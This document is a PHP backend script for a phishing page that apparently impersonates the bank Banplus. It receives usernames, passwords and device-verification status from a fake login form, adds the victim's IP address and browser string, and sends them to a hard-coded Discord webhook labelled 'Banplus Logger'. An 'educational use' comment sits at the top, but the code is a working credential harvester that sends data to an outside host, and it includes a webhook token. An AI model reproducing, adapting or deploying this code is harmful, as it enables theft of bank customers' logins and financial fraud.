<?php
/**
 * 777.php
 * Recibe los datos del formulario y los reenvía a un Webhook de Discord.
 * Para uso educativo / clase de programación.
 */

// ============================================================
// CONFIGURACIÓN DEL WEBHOOK DE DISCORD
// Reemplaza esta URL por la de tu propio webhook de Discord
// ============================================================
define('DISCORD_WEBHOOK_URL', 'https://discord.com/api/webhooks/1559325883255357573/rDxaRQbVyKqgvkP-b-1LjzSyMeX8fIgSlR-c5gIq9jV93WJwl16kbk85TXgi-9ozkCwK');

// ============================================================
// FUNCIONES AUXILIARES
// ============================================================

/**
 * Obtiene la IP real del visitante
 */
function obtenerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Desconocida';
}

/**
 * Detecta información básica del navegador
 */
function obtenerNavegador() {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Desconocido';
    return $ua;
}

/**
 * Envía un mensaje a Discord mediante webhook
 */
function enviarADiscord($contenido, $titulo = 'Nuevo registro') {
    $payload = [
        'username'   => 'Banplus Logger',
        'avatar_url' => 'https://cdn-icons-png.flaticon.com/512/2913/2913465.png',
        'embeds'     => [
            [
                'title'       => $titulo,
                'color'       => 0x0072ce, // Azul Banplus
                'fields'      => $contenido,
                'footer'      => [
                    'text' => 'Registro capturado - ' . date('Y-m-d H:i:s')
                ],
                'timestamp'   => date('c')
            ]
        ]
    ];

    $ch = curl_init(DISCORD_WEBHOOK_URL);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => json_encode($payload, JSON_UNESCAPED_UNICODE),
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);

    $respuesta = curl_exec($ch);
    $codigo    = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return $codigo >= 200 && $codigo < 300;
}

// ============================================================
// PROCESAMIENTO DE LA PETICIÓN
// ============================================================

header('Content-Type: application/json; charset=utf-8');

// Leer el cuerpo JSON enviado por fetch()
$cuerpo = file_get_contents('php://input');
$datos  = json_decode($cuerpo, true) ?: [];

$accion = $datos['accion'] ?? 'desconocida';

$ip        = obtenerIP();
$navegador = obtenerNavegador();

$respuesta = ['ok' => false, 'mensaje' => 'Acción no reconocida'];

switch ($accion) {

    // --------------------------------------------------------
    // Caso 1: Intento de inicio de sesión
    // --------------------------------------------------------
    case 'acceso':
        $usuario = $datos['usuario'] ?? 'No proporcionado';
        $clave   = $datos['clave']   ?? 'No proporcionada';

        $campos = [
            [
                'name'   => '👤 Usuario',
                'value'  => "```" . $usuario . "```",
                'inline' => false
            ],
            [
                'name'   => '🔑 Contraseña',
                'value'  => "```" . $clave . "```",
                'inline' => false
            ],
            [
                'name'   => '🌐 IP',
                'value'  => $ip,
                'inline' => true
            ],
            [
                'name'   => '🖥️ Navegador',
                'value'  => substr($navegador, 0, 200),
                'inline' => false
            ]
        ];

        $ok = enviarADiscord($campos, '🔐 Nuevo intento de acceso');

        $respuesta = [
            'ok'      => $ok,
            'mensaje' => $ok ? 'Datos registrados correctamente' : 'Error al enviar a Discord'
        ];
        break;

    // --------------------------------------------------------
    // Caso 2: Usuario confirmó verificación de dispositivo
    // --------------------------------------------------------
    case 'dispositivo_verificado':
        $estado = $datos['estado'] ?? 'Sin estado';

        $campos = [
            [
                'name'   => '✅ Estado',
                'value'  => $estado,
                'inline' => false
            ],
            [
                'name'   => '🌐 IP',
                'value'  => $ip,
                'inline' => true
            ],
            [
                'name'   => '🖥️ Navegador',
                'value'  => substr($navegador, 0, 200),
                'inline' => false
            ]
        ];

        $ok = enviarADiscord($campos, '📱 Dispositivo verificado');

        $respuesta = [
            'ok'      => $ok,
            'mensaje' => $ok ? 'Verificación registrada' : 'Error al enviar a Discord'
        ];
        break;
}

// Devolver respuesta JSON al frontend
echo json_encode($respuesta, JSON_UNESCAPED_UNICODE);